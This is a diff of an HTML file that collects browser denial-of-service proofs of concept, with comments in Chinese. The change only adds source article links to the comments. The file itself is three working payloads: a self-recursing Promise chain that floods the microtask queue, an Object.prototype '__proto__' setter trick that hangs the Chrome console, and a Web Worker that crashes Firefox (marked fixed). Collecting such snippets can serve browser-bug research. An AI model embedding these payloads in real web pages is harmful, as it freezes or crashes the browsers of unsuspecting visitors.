@@ -1,11 +1,15 @@
-<!-- Promise 死循环 DoS -->
+<!-- Promise 死循环 DoS
+http://www.web-tinker.com/article/20716.html
+-->
 <script>
     (function callee(){
         Promise.resolve().then(callee);
     })();
 </script>
 
-<!-- Chrome Console __proto__ DoS -->
+<!-- Chrome Console __proto__ DoS
+http://www.web-tinker.com/article/20760.html
+-->
 <script>
     Object.defineProperty(Object.prototype,"__proto__",{
         set:console.log.bind(console,[]),
@@ -14,7 +18,9 @@
     console.log([1,2,3]);
 </script>
 
-<!-- Firefox Worker 崩溃 DoS -->
+<!-- Firefox Worker 崩溃 DoS
+http://www.web-tinker.com/article/20726.html
+-->
 <!-- fixed -->
 <script>
     new Worker('data:text/javascript,new WeakMap().set(self);');
